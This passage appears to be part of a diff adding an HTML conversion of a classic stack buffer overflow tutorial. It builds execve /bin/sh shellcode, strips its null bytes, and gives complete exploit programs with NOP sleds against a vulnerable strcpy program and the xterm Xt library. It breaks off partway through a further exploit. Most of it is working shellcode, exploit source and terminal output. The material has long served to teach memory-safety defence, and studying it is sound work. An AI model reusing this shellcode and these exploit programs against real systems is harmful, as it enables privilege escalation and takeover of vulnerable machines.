+We copy the value 0x80027b8 (the address of the string "/bin/sh")
+into the first pointer of name[]. This is equivalent to:
+</p>
+
+<p>
+name[0] = "/bin/sh";
+</p>
+
+<p>
+0x800013d &lt;main+13&gt;:    movl   $0x0,0xfffffffc(%ebp)
+</p>
+
+<p>
+We copy the value 0x0 (NULL) into the seconds pointer of name[].
+This is equivalent to:
+</p>
+
+<p>
+name[1] = NULL;
+</p>
+
+<p>
+The actual call to execve() starts here.
+</p>
+
+<p>
+0x8000144 &lt;main+20&gt;:    pushl  $0x0
+</p>
+
+<p>
+We push the arguments to execve() in reverse order onto the stack.
+We start with NULL.
+</p>
+
+<p>
+0x8000146 &lt;main+22&gt;:    leal   0xfffffff8(%ebp),%eax
+</p>
+
+<p>
+We load the address of name[] into the EAX register.
+</p>
+
+<p>
+0x8000149 &lt;main+25&gt;:    pushl  %eax
+</p>
+
+<p>
+We push the address of name[] onto the stack.
+</p>
+
+<p>
+0x800014a &lt;main+26&gt;:    movl   0xfffffff8(%ebp),%eax
+</p>
+
+<p>
+We load the address of the string "/bin/sh" into the EAX register.
+</p>
+
+<p>
+0x800014d &lt;main+29&gt;:    pushl  %eax
+</p>
+
+<p>
+We push the address of the string "/bin/sh" onto the stack.
+</p>
+
+<p>
+0x800014e &lt;main+30&gt;:    call   0x80002bc &lt;_<sub>execve</sub>&gt;
+</p>
+
+<p>
+Call the library procedure execve().  The call instruction pushes the
+IP onto the stack.
+</p>
+<hr />
+
+<p>
+   Now execve().  Keep in mind we are using a Intel based Linux system.  The
+syscall details will change from OS to OS, and from CPU to CPU.  Some will 
+pass the arguments on the stack, others on the registers.  Some use a software
+interrupt to jump to kernel mode, others use a far call.  Linux passes its 
+arguments to the system call on the registers, and uses a software interrupt 
+to jump into kernel mode.
+</p>
+
+<hr />
+<p>
+0x80002bc &lt;_<sub>execve</sub>&gt;:   pushl  %ebp
+0x80002bd &lt;_<sub>execve</sub>+1&gt;: movl   %esp,%ebp
+0x80002bf &lt;_<sub>execve</sub>+3&gt;: pushl  %ebx
+</p>
+
+<p>
+The procedure prelude.
+</p>
+
+<p>
+0x80002c0 &lt;_<sub>execve</sub>+4&gt;: movl   $0xb,%eax
+</p>
+
+<p>
+Copy 0xb (11 decimal) onto the stack. This is the index into the
+syscall table.  11 is execve.
+</p>
+
+<p>
+0x80002c5 &lt;_<sub>execve</sub>+9&gt;: movl   0x8(%ebp),%ebx
+</p>
+
+<p>
+Copy the address of "/bin/sh" into EBX.
+</p>
+
+<p>
+0x80002c8 &lt;_<sub>execve</sub>+12&gt;:        movl   0xc(%ebp),%ecx
+</p>
+
+<p>
+Copy the address of name[] into ECX.
+</p>
+
+<p>
+0x80002cb &lt;_<sub>execve</sub>+15&gt;:        movl   0x10(%ebp),%edx
+</p>
+
+<p>
+Copy the address of the null pointer into %edx.
+</p>
+
+<p>
+0x80002ce &lt;_<sub>execve</sub>+18&gt;:        int    $0x80
+</p>
+
+<p>
+Change into kernel mode.
+</p>
+<hr />
+
+<p>
+So as we can see there is not much to the execve() system call.  All we need
+to do is:
+</p>
+
+<p>
+a) Have the null terminated string "/bin/sh" somewhere in memory.
+b) Have the address of the string "/bin/sh" somewhere in memory
+   followed by a null long word.
+c) Copy 0xb into the EAX register.
+d) Copy the address of the address of the string "/bin/sh" into the
+   EBX register.
+e) Copy the address of the string "/bin/sh" into the ECX register.
+f) Copy the address of the null long word into the EDX register.
+g) Execute the int $0x80 instruction.
+</p>
+
+<p>
+   But what if the execve() call fails for some reason?  The program will
+continue fetching instructions from the stack, which may contain random data!
+The program will most likely core dump.  We want the program to exit cleanly
+if the execve syscall fails.  To accomplish this we must then add a exit
+syscall after the execve syscall.  What does the exit syscall looks like?
+</p>
+
+<p>
+exit.c
+</p>
+<hr />
+<p>
+#include &lt;stdlib.h&gt;
+</p>
+
+<p>
+void main() {
+        exit(0);
+}
+</p>
+<hr />
+
+<hr />
+<p>
+[aleph1]$ gcc -o exit -static exit.c
+[aleph1]$ gdb exit
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc&#x2026;
+(no debugging symbols found)&#x2026;
+(gdb) disassemble _exit
+Dump of assembler code for function _exit:
+0x800034c &lt;<sub>exit</sub>&gt;:      pushl  %ebp
+0x800034d &lt;<sub>exit</sub>+1&gt;:    movl   %esp,%ebp
+0x800034f &lt;<sub>exit</sub>+3&gt;:    pushl  %ebx
+0x8000350 &lt;<sub>exit</sub>+4&gt;:    movl   $0x1,%eax
+0x8000355 &lt;<sub>exit</sub>+9&gt;:    movl   0x8(%ebp),%ebx
+0x8000358 &lt;<sub>exit</sub>+12&gt;:   int    $0x80
+0x800035a &lt;<sub>exit</sub>+14&gt;:   movl   0xfffffffc(%ebp),%ebx
+0x800035d &lt;<sub>exit</sub>+17&gt;:   movl   %ebp,%esp
+0x800035f &lt;<sub>exit</sub>+19&gt;:   popl   %ebp
+0x8000360 &lt;<sub>exit</sub>+20&gt;:   ret
+0x8000361 &lt;<sub>exit</sub>+21&gt;:   nop
+0x8000362 &lt;<sub>exit</sub>+22&gt;:   nop
+0x8000363 &lt;<sub>exit</sub>+23&gt;:   nop
+End of assembler dump.
+</p>
+<hr />
+
+<p>
+   The exit syscall will place 0x1 in EAX, place the exit code in EBX,
+and execute "int 0x80".  That's it.  Most applications return 0 on exit to
+indicate no errors.  We will place 0 in EBX.  Our list of steps is now:
+</p>
+
+<p>
+a) Have the null terminated string "/bin/sh" somewhere in memory.
+b) Have the address of the string "/bin/sh" somewhere in memory
+   followed by a null long word.
+c) Copy 0xb into the EAX register.
+d) Copy the address of the address of the string "/bin/sh" into the
+   EBX register.
+e) Copy the address of the string "/bin/sh" into the ECX register.
+f) Copy the address of the null long word into the EDX register.
+g) Execute the int $0x80 instruction.
+h) Copy 0x1 into the EAX register.
+i) Copy 0x0 into the EBX register.
+j) Execute the int $0x80 instruction.
+</p>
+
+<p>
+   Trying to put this together in assembly language, placing the string
+after the code, and remembering we will place the address of the string,
+and null word after the array, we have:
+</p>
+
+<hr />
+<p>
+	movl   string<sub>addr,string</sub><sub>addr</sub><sub>addr</sub>
+movb   $0x0,null<sub>byte</sub><sub>addr</sub>
+	movl   $0x0,null<sub>addr</sub>
+	movl   $0xb,%eax
+	movl   string<sub>addr</sub>,%ebx
+	leal   string<sub>addr</sub>,%ecx
+	leal   null<sub>string</sub>,%edx
+	int    $0x80
+	movl   $0x1, %eax
+	movl   $0x0, %ebx
+int    $0x80
+	/bin/sh string goes here.
+</p>
+<hr />
+
+<p>
+   The problem is that we don't know where in the memory space of the 
+program we are trying to exploit the code (and the string that follows 
+it) will be placed.  One way around it is to use a JMP, and a CALL 
+instruction.  The JMP and CALL instructions can use IP relative addressing, 
+which means we can jump to an offset from the current IP without needing 
+to know the exact address of where in memory we want to jump to.  If we 
+place a CALL instruction right before the "/bin/sh" string, and a JMP 
+instruction to it, the strings address will be pushed onto the stack as 
+the return address when CALL is executed.  All we need then is to copy the 
+return address into a register.  The CALL instruction can simply call the 
+start of our code above.  Assuming now that J stands for the JMP instruction,
+C for the CALL instruction, and s for the string,  the execution flow would 
+now be:
+</p>
+
+
+<p>
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+           buffer                sfp   ret   a     b     c
+</p>
+
+<p>
+&lt;-&#x2013;&#x2014;   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
+           ^|^             ^|            |
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left">&#xa0;</td>
+<td class="org-left">&#xa0;</td>
+<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">_</span></span></span></span></span></span></td>
+<td class="org-left">&#xa0;</td>
+<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></td>
+<td class="org-left">(1)</td>
+</tr>
+</tbody>
+</table>
+<p>
+(2)  ||_____________||
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></span></td>
+<td class="org-left">(3)</td>
+</tr>
+</tbody>
+</table>
+<p>
+top of                                                            bottom of
+stack                                                                 stack
+</p>
+
+
+
+<p>
+   With this modifications, using indexed addressing, and writing down how
+many bytes each instruction takes our code looks like:
+</p>
+
+<hr />
+<p>
+	jmp    offset-to-call           # 2 bytes
+	popl   %esi                     # 1 byte
+	movl   %esi,array-offset(%esi)  # 3 bytes
+	movb   $0x0,nullbyteoffset(%esi)# 4 bytes
+	movl   $0x0,null-offset(%esi)   # 7 bytes
+	movl   $0xb,%eax                # 5 bytes
+	movl   %esi,%ebx                # 2 bytes
+	leal   array-offset,(%esi),%ecx # 3 bytes
+	leal   null-offset(%esi),%edx   # 3 bytes
+	int    $0x80                    # 2 bytes
+	movl   $0x1, %eax		# 5 bytes
+	movl   $0x0, %ebx		# 5 bytes
+int    $0x80			# 2 bytes
+	call   offset-to-popl           # 5 bytes
+	/bin/sh string goes here.
+</p>
+<hr />
+
+<p>
+   Calculating the offsets from jmp to call, from call to popl, from
+the string address to the array, and from the string address to the null
+long word, we now have:
+</p>
+
+<hr />
+<p>
+	jmp    0x26                     # 2 bytes
+	popl   %esi                     # 1 byte
+	movl   %esi,0x8(%esi)           # 3 bytes
+	movb   $0x0,0x7(%esi)		# 4 bytes
+	movl   $0x0,0xc(%esi)           # 7 bytes
+	movl   $0xb,%eax                # 5 bytes
+	movl   %esi,%ebx                # 2 bytes
+	leal   0x8(%esi),%ecx           # 3 bytes
+	leal   0xc(%esi),%edx           # 3 bytes
+	int    $0x80                    # 2 bytes
+	movl   $0x1, %eax		# 5 bytes
+	movl   $0x0, %ebx		# 5 bytes
+int    $0x80			# 2 bytes
+	call   -0x2b                    # 5 bytes
+	.string \"/bin/sh\"		# 8 bytes
+</p>
+<hr />
+
+<p>
+   Looks good. To make sure it works correctly we must compile it and run it.
+But there is a problem.  Our code modifies itself, but most operating system
+mark code pages read-only.  To get around this restriction we must place the
+code we wish to execute in the stack or data segment, and transfer control
+to it.  To do so we will place our code in a global array in the data
+segment.  We need first a hex representation of the binary code. Lets
+compile it first, and then use gdb to obtain it.
+</p>
+
+<p>
+shellcodeasm.c
+</p>
+<hr />
+<p>
+void main() {
+_<sub>asm</sub>_<sub>("
+        jmp    0x2a                     # 3 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0x8(%esi)           # 3 bytes
+        movb   $0x0,0x7(%esi)           # 4 bytes
+        movl   $0x0,0xc(%esi)           # 7 bytes
+        movl   $0xb,%eax                # 5 bytes
+        movl   %esi,%ebx                # 2 bytes
+        leal   0x8(%esi),%ecx           # 3 bytes
+        leal   0xc(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        movl   $0x1, %eax               # 5 bytes
+        movl   $0x0, %ebx               # 5 bytes
+        int    $0x80                    # 2 bytes
+        call   -0x2f                    # 5 bytes
+        .string \"/bin/sh\"             # 8 bytes
+")</sub>;
+}
+</p>
+<hr />
+
+<hr />
+<p>
+[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
+[aleph1]$ gdb shellcodeasm
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc&#x2026;
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000130 &lt;main&gt;:       pushl  %ebp
+0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
+0x8000133 &lt;main+3&gt;:     jmp    0x800015f &lt;main+47&gt;
+0x8000135 &lt;main+5&gt;:     popl   %esi
+0x8000136 &lt;main+6&gt;:     movl   %esi,0x8(%esi)
+0x8000139 &lt;main+9&gt;:     movb   $0x0,0x7(%esi)
+0x800013d &lt;main+13&gt;:    movl   $0x0,0xc(%esi)
+0x8000144 &lt;main+20&gt;:    movl   $0xb,%eax
+0x8000149 &lt;main+25&gt;:    movl   %esi,%ebx
+0x800014b &lt;main+27&gt;:    leal   0x8(%esi),%ecx
+0x800014e &lt;main+30&gt;:    leal   0xc(%esi),%edx
+0x8000151 &lt;main+33&gt;:    int    $0x80
+0x8000153 &lt;main+35&gt;:    movl   $0x1,%eax
+0x8000158 &lt;main+40&gt;:    movl   $0x0,%ebx
+0x800015d &lt;main+45&gt;:    int    $0x80
+0x800015f &lt;main+47&gt;:    call   0x8000135 &lt;main+5&gt;
+0x8000164 &lt;main+52&gt;:    das
+0x8000165 &lt;main+53&gt;:    boundl 0x6e(%ecx),%ebp
+0x8000168 &lt;main+56&gt;:    das
+0x8000169 &lt;main+57&gt;:    jae    0x80001d3 &lt;_<sub>new</sub><sub>exitfn</sub>+55&gt;
+0x800016b &lt;main+59&gt;:    addb   %cl,0x55c35dec(%ecx)
+End of assembler dump.
+(gdb) x/bx main+3
+0x8000133 &lt;main+3&gt;:     0xeb
+(gdb)
+0x8000134 &lt;main+4&gt;:     0x2a
+(gdb)
+.
+.
+.
+</p>
+<hr />
+
+<p>
+testsc.c
+</p>
+<hr />
+<p>
+char shellcode[] =
+	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+	"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+	"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+	"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
+</p>
+
+<p>
+void main() {
+   int *ret;
+</p>
+
+<p>
+ret = (int *)&amp;ret + 2;
+(*ret) = (int)shellcode;
+</p>
+
+<p>
+}
+</p>
+<hr />
+<hr />
+<p>
+[aleph1]$ gcc -o testsc testsc.c
+[aleph1]$ ./testsc
+$ exit
+[aleph1]$
+</p>
+<hr />
+
+<p>
+   It works! But there is an obstacle.  In most cases we'll be trying to
+overflow a character buffer.  As such any null bytes in our shellcode will be
+considered the end of the string, and the copy will be terminated.  There must
+be no null bytes in the shellcode for the exploit to work.  Let's try to
+eliminate the bytes (and at the same time make it smaller).
+</p>
+
+<p>
+Problem instruction:                 Substitute with:
+</p>
+<hr />
+<p>
+	movb   $0x0,0x7(%esi)                xorl   %eax,%eax
+molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
+										 movl   %eax,0xc(%esi)
+</p>
+<hr />
+<p>
+movl   $0xb,%eax                     movb   $0xb,%al
+</p>
+<hr />
+<p>
+movl   $0x1, %eax                    xorl   %ebx,%ebx
+movl   $0x0, %ebx                    movl   %ebx,%eax
+									 inc    %eax
+</p>
+<hr />
+
+<p>
+Our improved code:
+</p>
+
+<p>
+shellcodeasm2.c
+</p>
+<hr />
+<p>
+void main() {
+_<sub>asm</sub>__("
+        jmp    0x1f                     # 2 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0x8(%esi)           # 3 bytes
+        xorl   %eax,%eax                # 2 bytes
+	movb   %eax,0x7(%esi)		# 3 bytes
+        movl   %eax,0xc(%esi)           # 3 bytes
+        movb   $0xb,%al                 # 2 bytes
+        movl   %esi,%ebx                # 2 bytes
+        leal   0x8(%esi),%ecx           # 3 bytes
+        leal   0xc(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        xorl   %ebx,%ebx                # 2 bytes
+        movl   %ebx,%eax                # 2 bytes
+        inc    %eax                     # 1 bytes
+        int    $0x80                    # 2 bytes
+        call   -0x24                    # 5 bytes
+        .string \"/bin/sh\"             # 8 bytes
+</p>
+
+<p>
+");
+}
+</p>
+<hr />
+
+<p>
+And our new test program:
+</p>
+
+<p>
+testsc2.c
+</p>
+<hr />
+<p>
+char shellcode[] =
+	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+	"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+</p>
+
+<p>
+void main() {
+   int *ret;
+</p>
+
+<p>
+ret = (int *)&amp;ret + 2;
+(*ret) = (int)shellcode;
+</p>
+
+<p>
+}
+</p>
+<hr />
+<hr />
+<p>
+[aleph1]$ gcc -o testsc2 testsc2.c
+[aleph1]$ ./testsc2
+$ exit
+[aleph1]$
+</p>
+<hr />
+
+
+<p>
+	Writing an Exploit
+	<code>~~~~~~~~~~~~~~~~</code>
+(or how to mung the stack)
+<code>~~~~~~~~~~~~~~~~~~~~~~~~</code>
+</p>
+
+
+<p>
+   Lets try to pull all our pieces together.  We have the shellcode.  We know
+it must be part of the string which we'll use to overflow the buffer.  We 
+know we must point the return address back into the buffer.  This example will
+demonstrate these points:
+</p>
+
+<p>
+overflow1.c
+</p>
+<hr />
+<p>
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+</p>
+
+<p>
+char large<sub>string</sub>[128];
+</p>
+
+<p>
+void main() {
+  char buffer[96];
+  int i;
+  long *long<sub>ptr</sub> = (long *) large<sub>string</sub>;
+</p>
+
+<p>
+for (i = 0; i &lt; 32; i++)
+  *(long<sub>ptr</sub> + i) = (int) buffer;
+</p>
+
+<p>
+for (i = 0; i &lt; strlen(shellcode); i++)
+  large<sub>string</sub>[i] = shellcode[i];
+</p>
+
+<p>
+  strcpy(buffer,large<sub>string</sub>);
+}
+</p>
+<hr />
+
+<hr />
+<p>
+[aleph1]$ gcc -o exploit1 exploit1.c
+[aleph1]$ ./exploit1
+$ exit
+exit
+[aleph1]$
+</p>
+<hr />
+
+<p>
+   What we have done above is filled the array large<sub>string</sub>[] with the
+address of buffer[], which is where our code will be.  Then we copy our
+shellcode into the beginning of the large<sub>string</sub> string.  strcpy() will then
+copy large<sub>string</sub> onto buffer without doing any bounds checking, and will
+overflow the return address, overwriting it with the address where our code
+is now located.  Once we reach the end of main and it tried to return it
+jumps to our code, and execs a shell.
+</p>
+
+<p>
+   The problem we are faced when trying to overflow the buffer of another
+program is trying to figure out at what address the buffer (and thus our
+code) will be.  The answer is that for every program the stack will
+start at the same address.  Most programs do not push more than a few hundred
+or a few thousand bytes into the stack at any one time.  Therefore by knowing
+where the stack starts we can try to guess where the buffer we are trying to
+overflow will be.  Here is a little program that will print its stack
+pointer:
+</p>
+
+<p>
+sp.c
+</p>
+<hr />
+<p>
+unsigned long get<sub>sp</sub>(void) {
+   _<sub>asm</sub>_<sub>("movl %esp,%eax")</sub>;
+}
+void main() {
+  printf("0x%x\n", get<sub>sp</sub>());
+}
+</p>
+<hr />
+
+<hr />
+<p>
+[aleph1]$ ./sp
+0x8000470
+[aleph1]$
+</p>
+<hr />
+
+<p>
+Lets assume this is the program we are trying to overflow is:
+</p>
+
+<p>
+vulnerable.c
+</p>
+<hr />
+<p>
+void main(int argc, char *argv[]) {
+  char buffer[512];
+</p>
+
+<p>
+  if (argc &gt; 1)
+    strcpy(buffer,argv[1]);
+}
+</p>
+<hr />
+
+<p>
+   We can create a program that takes as a parameter a buffer size, and an
+offset from its own stack pointer (where we believe the buffer we want to
+overflow may live).  We'll put the overflow string in an environment variable
+so it is easy to manipulate:
+</p>
+
+<p>
+exploit2.c
+</p>
+<hr />
+<p>
+#include &lt;stdlib.h&gt;
+</p>
+
+<p>
+#define DEFAULT<sub>OFFSET</sub>                    0
+#define DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>             512
+</p>
+
+<p>
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+</p>
+
+<p>
+unsigned long get<sub>sp</sub>(void) {
+   _<sub>asm</sub>_<sub>("movl %esp,%eax")</sub>;
+}
+</p>
+
+<p>
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr<sub>ptr</sub>, addr;
+  int offset=DEFAULT<sub>OFFSET</sub>, bsize=DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>;
+  int i;
+</p>
+
+<p>
+if (argc &gt; 1) bsize  = atoi(argv[1]);
+if (argc &gt; 2) offset = atoi(argv[2]);
+</p>
+
+<p>
+if (!(buff = malloc(bsize))) {
+  printf("Can't allocate memory.\n");
+  exit(0);
+}
+</p>
+
+<p>
+addr = get<sub>sp</sub>() - offset;
+printf("Using address: 0x%x\n", addr);
+</p>
+
+<p>
+ptr = buff;
+addr<sub>ptr</sub> = (long *) ptr;
+for (i = 0; i &lt; bsize; i+=4)
+  *(addr<sub>ptr</sub>++) = addr;
+</p>
+
+<p>
+ptr <del>= 4;
+for (i = 0; i &lt; strlen(shellcode); i+</del>)
+  *(ptr++) = shellcode[i];
+</p>
+
+<p>
+buff[bsize - 1] = '\0';
+</p>
+
+<p>
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+</p>
+<hr />
+
+<p>
+Now we can try to guess what the buffer and offset should be:
+</p>
+
+<hr />
+<p>
+[aleph1]$ ./exploit2 500
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable \(EGG
+[aleph1]\) exit
+[aleph1]$ ./exploit2 600
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable \(EGG
+Illegal instruction
+[aleph1]\) exit
+[aleph1]$ ./exploit2 600 100
+Using address: 0xbffffd4c
+[aleph1]$ ./vulnerable \(EGG
+Segmentation fault
+[aleph1]\) exit
+[aleph1]$ ./exploit2 600 200
+Using address: 0xbffffce8
+[aleph1]$ ./vulnerable \(EGG
+Segmentation fault
+[aleph1]\) exit
+.
+.
+.
+[aleph1]$ ./exploit2 600 1564
+Using address: 0xbffff794
+[aleph1]$ ./vulnerable $EGG
+$
+</p>
+<hr />
+
+<p>
+   As we can see this is not an efficient process.  Trying to guess the
+offset even while knowing where the beginning of the stack lives is nearly
+impossible.  We would need at best a hundred tries, and at worst a couple of
+thousand.  The problem is we need to guess <b>exactly</b> where the address of our 
+code will start.  If we are off by one byte more or less we will just get a
+segmentation violation or a invalid instruction.  One way to increase our
+chances is to pad the front of our overflow buffer with NOP instructions.
+Almost all processors have a NOP instruction that performs a null operation.
+It is usually used to delay execution for purposes of timing.  We will take
+advantage of it and fill half of our overflow buffer with them.  We will place
+our shellcode at the center, and then follow it with the return addresses. If
+we are lucky and the return address points anywhere in the string of NOPs,
+they will just get executed until they reach our code.  In the Intel
+architecture the NOP instruction is one byte long and it translates to 0x90
+in machine code.  Assuming the stack starts at address 0xFF, that S stands for
+shell code, and that N stands for a NOP instruction the new stack would look
+like this:
+</p>
+
+<p>
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+           buffer                sfp   ret   a     b     c
+</p>
+
+<p>
+&lt;-&#x2013;&#x2014;   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
+                 ^                     |
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">_</span></span></span></span></span></span></span></span></span></span></td>
+</tr>
+</tbody>
+</table>
+<p>
+top of                                                            bottom of
+stack                                                                 stack
+</p>
+
+<p>
+The new exploits is then:
+</p>
+
+<p>
+exploit3.c
+</p>
+<hr />
+<p>
+#include &lt;stdlib.h&gt;
+</p>
+
+<p>
+#define DEFAULT<sub>OFFSET</sub>                    0
+#define DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>             512
+#define NOP                            0x90
+</p>
+
+<p>
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+</p>
+
+<p>
+unsigned long get<sub>sp</sub>(void) {
+   _<sub>asm</sub>_<sub>("movl %esp,%eax")</sub>;
+}
+</p>
+
+<p>
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr<sub>ptr</sub>, addr;
+  int offset=DEFAULT<sub>OFFSET</sub>, bsize=DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>;
+  int i;
+</p>
+
+<p>
+if (argc &gt; 1) bsize  = atoi(argv[1]);
+if (argc &gt; 2) offset = atoi(argv[2]);
+</p>
+
+<p>
+if (!(buff = malloc(bsize))) {
+  printf("Can't allocate memory.\n");
+  exit(0);
+}
+</p>
+
+<p>
+addr = get<sub>sp</sub>() - offset;
+printf("Using address: 0x%x\n", addr);
+</p>
+
+<p>
+ptr = buff;
+addr<sub>ptr</sub> = (long *) ptr;
+for (i = 0; i &lt; bsize; i+=4)
+  *(addr<sub>ptr</sub>++) = addr;
+</p>
+
+<p>
+for (i = 0; i &lt; bsize/2; i++)
+  buff[i] = NOP;
+</p>
+
+<p>
+ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+for (i = 0; i &lt; strlen(shellcode); i++)
+  *(ptr++) = shellcode[i];
+</p>
+
+<p>
+buff[bsize - 1] = '\0';
+</p>
+
+<p>
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+</p>
+<hr />
+
+<p>
+   A good selection for our buffer size is about 100 bytes more than the size
+of the buffer we are trying to overflow.  This will place our code at the end
+of the buffer we are trying to overflow, giving a lot of space for the NOPs,
+but still overwriting the return address with the address we guessed.  The
+buffer we are trying to overflow is 512 bytes long, so we'll use 612.  Let's
+try to overflow our test program with our new exploit:
+</p>
+
+<hr />
+<p>
+[aleph1]$ ./exploit3 612
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable $EGG
+$
+</p>
+<hr />
+
+<p>
+   Whoa!  First try!  This change has improved our chances a hundredfold. 
+Let's try it now on a real case of a buffer overflow.  We'll use for our
+demonstration the buffer overflow on the Xt library.  For our example, we'll 
+use xterm (all programs linked with the Xt library are vulnerable). You must
+be running an X server and allow connections to it from the localhost.  Set
+your DISPLAY variable accordingly.
+</p>
+
+<hr />
+<p>
+[aleph1]$ export DISPLAY=:0.0
+[aleph1]$ ./exploit3 1124
+Using address: 0xbffffdb4
+[aleph1]$ /usr/X11R6/bin/xterm -fg \(EGG
+^C
+[aleph1]\) exit
+[aleph1]$ ./exploit3 2148 100
+Using address: 0xbffffd48
+[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
+</p>
+
+<p>
+&#x2026;.
+Warning: some arguments in previous message were lost
+Illegal instruction
+[aleph1]$ exit
+.
+.
+.
+[aleph1]$ ./exploit4 2148 600
+Using address: 0xbffffb54
+[aleph1]$ /usr/X11R6/bin/xterm -fg \(EGG
+Warning: some arguments in previous message were lost
+bash\)
+</p>
+<hr />
+
+<p>
+   Eureka! Less than a dozen tries and we found the magic numbers. If xterm
+where installed suid root this would now be a root shell.
+</p>
+
+
+<p>
+Small Buffer Overflows
+<code>~~~~~~~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+   There will be times when the buffer you are trying to overflow is so
+small that either the shellcode wont fit into it, and it will overwrite the
+return address with instructions instead of the address of our code, or the
+number of NOPs you can pad the front of the string with is so small that the
+chances of guessing their address is minuscule.  To obtain a shell from these
+programs we will have to go about it another way.  This particular approach
+only works when you have access to the program's environment variables.
+</p>
+
+<p>
+   What we will do is place our shellcode in an environment variable, and
+then overflow the buffer with the address of this variable in memory.  This
+method also increases your changes of the exploit working as you can make
+the environment variable holding the shell code as large as you want.
+</p>
+
+<p>
+   The environment variables are stored in the top of the stack when the
+program is started, any modification by setenv() are then allocated
+elsewhere.  The stack at the beginning then looks like this:
+</p>
+
+
+<p>
+&lt;strings&gt;&lt;argv pointers&gt;NULL&lt;envp pointers&gt;NULL&lt;argc&gt;&lt;argv&gt;&lt;envp&gt;
+</p>
+
+<p>
+   Our new program will take an extra variable, the size of the variable
+containing the shellcode and NOPs. Our new exploit now looks like this:
+</p>
+
+<p>
+exploit4.c
+</p>
+<hr />
+<p>
+#include &lt;stdlib.h&gt;
+</p>
+
+<p>
+#define DEFAULT<sub>OFFSET</sub>                    0
+#define DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>             512
